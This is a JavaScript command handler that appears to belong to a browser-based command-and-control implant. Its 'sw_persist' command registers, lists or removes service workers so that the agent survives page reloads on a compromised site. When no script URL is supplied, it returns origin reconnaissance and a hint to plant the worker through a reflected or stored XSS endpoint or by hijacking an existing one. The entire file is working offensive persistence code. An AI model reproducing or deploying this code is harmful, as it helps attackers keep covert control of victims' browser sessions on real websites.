COMMANDS['sw_persist'] = async function(task) {
    var params = parseParams(task);
    var action = (params && params.action) ? params.action : 'install';

    if (!('serviceWorker' in navigator)) {
        return JSON.stringify({error: 'Service Worker API not available (requires HTTPS)'}, null, 2);
    }

    if (action === 'status') {
        var regs = await navigator.serviceWorker.getRegistrations();
        var list = [];
        for (var i = 0; i < regs.length; i++) {
            list.push({
                scope: regs[i].scope,
                active: regs[i].active ? regs[i].active.scriptURL : null,
                waiting: regs[i].waiting ? regs[i].waiting.scriptURL : null,
                installing: regs[i].installing ? regs[i].installing.scriptURL : null
            });
        }
        return JSON.stringify({action: 'status', registrations: list}, null, 2);
    }

    if (action === 'remove') {
        var regs2 = await navigator.serviceWorker.getRegistrations();
        var removed = 0;
        for (var j = 0; j < regs2.length; j++) {
            await regs2[j].unregister();
            removed++;
        }
        return JSON.stringify({action: 'remove', removed: removed}, null, 2);
    }

    // Install: register a service worker for persistence
    // Browsers require a same-origin HTTP(S) URL — blob/data URIs are rejected.
    var swUrl = (params && params.url) ? params.url : '';
    var scope = (params && params.scope) ? params.scope : '/';

    if (!swUrl) {
        // No URL provided — gather recon so the operator knows what's possible
        var existingRegs = await navigator.serviceWorker.getRegistrations();
        var existing = [];
        for (var k = 0; k < existingRegs.length; k++) {
            existing.push({
                scope: existingRegs[k].scope,
                scriptURL: existingRegs[k].active ? existingRegs[k].active.scriptURL : null
            });
        }
        return JSON.stringify({
            action: 'install',
            error: 'url parameter required. Service workers must be registered from a same-origin HTTP/HTTPS URL.',
            hint: 'Host a SW script on your infrastructure at a path under the target origin, or find an existing SW to hijack. Use inject_script or a reflected/stored XSS endpoint that returns JS with the correct Content-Type.',
            origin: window.location.origin,
            secureContext: window.isSecureContext,
            existingRegistrations: existing
        }, null, 2);
    }

    try {
        var reg = await navigator.serviceWorker.register(swUrl, {scope: scope});
        return JSON.stringify({
            action: 'install',
            method: 'url',
            url: swUrl,
            scope: reg.scope,
            status: 'registered',
            note: 'Service worker installed. Agent will persist across page reloads within scope.'
        }, null, 2);
    } catch (e) {
        return JSON.stringify({
            action: 'install',
            method: 'url',
            url: swUrl,
            error: e.message,
            origin: window.location.origin,
            secureContext: window.isSecureContext
        }, null, 2);
    }
};
